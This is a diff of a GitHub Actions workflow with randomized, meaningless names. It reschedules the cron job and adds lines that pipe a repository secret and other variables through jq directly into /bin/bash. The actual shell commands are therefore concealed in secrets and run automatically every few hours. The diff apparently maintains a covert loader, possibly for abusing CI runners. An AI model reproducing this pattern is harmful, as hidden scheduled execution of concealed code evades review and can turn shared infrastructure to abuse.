@@ -2,28 +2,20 @@ name: fnjcjkkk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 4/6 * * *'
-jobs:  # 4500
+    - cron: '55 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fnjcjkkk
         env:
-          fwp010: ${{ secrets.fwp010 }}
+          gg5: ${{ secrets.gg5 }}
         run: |
-          echo $fwp010 | jq -r .w87977 | /bin/bash
-          echo $xeiye38 | jq -r .bh80 | /bin/bash
-          echo $oiank932 | jq -r .y48 | /bin/bash
-          echo $bpi586 | jq -r .e7 | /bin/bash
-          echo $zs010 | jq -r .ja173 | /bin/bash
-          echo $iklcp56953 | jq -r .mwno6822 | /bin/bash
-          echo $oz89 | jq -r .eza22830 | /bin/bash
-          echo $ykgxv41 | jq -r .msuv263 | /bin/bash
-          echo $vy98116 | jq -r .r099 | /bin/bash
-          echo $kxgz9 | jq -r .zakue38 | /bin/bash
-          echo $t03 | jq -r .iwgdu0 | /bin/bash
-          echo $ffdx2287 | jq -r .sgw687 | /bin/bash
-          echo $twcsg8739 | jq -r .hzh764 | /bin/bash
-          echo $pc9 | jq -r .jmtq5400 | /bin/bash
+          echo $gg5 | jq -r .cxin65 | /bin/bash
+          echo $w9 | jq -r .yqesu56 | /bin/bash
+          echo $j44962 | jq -r .glavr491 | /bin/bash
+          echo $zqtjl410 | jq -r .cbfrj0882 | /bin/bash
 
